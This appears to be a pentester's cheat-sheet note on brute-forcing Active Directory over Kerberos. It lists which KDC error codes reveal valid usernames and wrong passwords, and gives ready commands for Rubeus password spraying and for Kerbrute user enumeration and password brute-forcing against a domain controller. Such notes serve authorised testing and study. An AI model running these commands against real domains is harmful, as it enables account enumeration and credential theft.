#rubeus #kerbrute
# Brute Force
We can brute force username and password based on the errors that we get from kerberos.
- `KDC_ERR_PREAUTH_FAILED`: Incorrect password
- `KDC_ERR_C_PRINCIPAL_UNKNOWN`: Invalid username
- `KDC_ERR_WRONG_REALM`: Invalid domain
- `KDC_ERR_CLIENT_REVOKED`: Disabled/Blocked user
### Rubeus
```powershell
./rubeus.exe brute /password:<password> /noticket
```
### Kerbrute (go)
1. User Enumeration
```bash
./kerbrute userenum -d mydomain.local usernames.txt
```
2. Password brute-force
```bash
cat user_password.txt | ./kerbrute -d mydomain.local bruteforce -
```
### Kerbrute.py
```bash
python kerbrute.py -domain mydomain.local -users user.txt -passwords pass.txt -dc-ip <ip>
```